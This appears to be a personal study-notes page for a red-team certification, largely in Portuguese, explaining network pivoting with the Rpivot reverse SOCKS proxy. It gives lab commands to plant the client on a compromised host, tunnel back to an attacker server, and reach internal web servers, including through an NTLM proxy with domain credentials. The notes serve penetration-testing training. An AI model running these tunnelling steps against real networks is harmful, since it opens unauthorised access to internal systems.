> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/web-server-pivoting-with-rpivot.md).

# Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) é uma ferramenta de proxy SOCKS reverso escrita em Python para tunelamento SOCKS. Rpivot vincula uma máquina dentro de uma rede corporativa a um servidor externo e expõe a porta local do cliente no lado do servidor.

* **Cloning rpivot**

```sh
sudo git clone https://github.com/klsecservices/rpivot.git
```

* **Installing Python2.7**

```sh
sudo apt-get install python2.7
```

* **Executando server.py do Host de Ataque**

```sh
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

* Antes de executar, `client.py`precisaremos transferir rpivot para o alvo. Podemos fazer isso usando este comando SCP:

```sh
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

* **Executando client.py do Pivot Target**

```sh
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

* **Navegando até o servidor web de destino usando Proxychains**

```sh
proxychains firefox-esr 172.16.5.135:80
```

* **Conectando-se a um servidor Web usando HTTP-Proxy e autenticação NTLM**

```sh
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
